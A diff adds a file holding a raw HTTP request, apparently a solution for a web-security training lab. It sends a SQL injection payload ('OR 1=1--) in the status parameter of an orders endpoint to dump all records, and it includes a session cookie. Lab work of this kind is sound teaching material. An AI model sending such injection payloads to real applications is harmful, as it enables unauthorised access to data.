@@ -1,0 +1,11 @@
+GET /api/a3/sql_injection/all_orders?status='OR+1%3d1--  HTTP/1.1
+Host: web0x01.hbtn
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://web0x01.hbtn/a3/sql_injection/
+Connection: keep-alive
+Cookie: session=e_eEaaxPv1tDigDW_SoCganVwr73Nlqq9MV-BleEE0k.7usyLCS8wgWXH5C8VjSFtx93Ew4
+Priority: u=0
+
